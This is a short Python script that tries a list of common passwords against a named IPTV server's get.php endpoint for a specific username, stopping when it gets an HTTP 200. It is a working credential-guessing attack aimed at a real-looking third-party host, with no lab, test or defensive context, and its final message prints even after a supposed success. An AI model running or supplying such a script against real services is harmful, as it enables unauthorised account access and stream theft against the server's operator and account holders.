import requests
import time

# Set your target URL and parameters
url = "http://ninsugi.com/get.php"
params = {"username": "537600254", "type": "m3u_plus", "output": "hls"}

# List of common passwords (adjust to your needs)
password_list = ["admin", "password", "1234", "test", "qwerty", "iloveyou"]

# Loop through the password list and test each combination
for password in password_list:
    print(f"Testing password: {password}")
    params["password"] = password  # Update the password parameter

    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:  # Success!
            print("Password found:", password)
            break
    except requests.exceptions.RequestException as e:
        print(f"Error trying {password}: {e}")

    time.sleep(0.1)  # Add a delay to avoid overwhelming the server

print("No valid password found!")
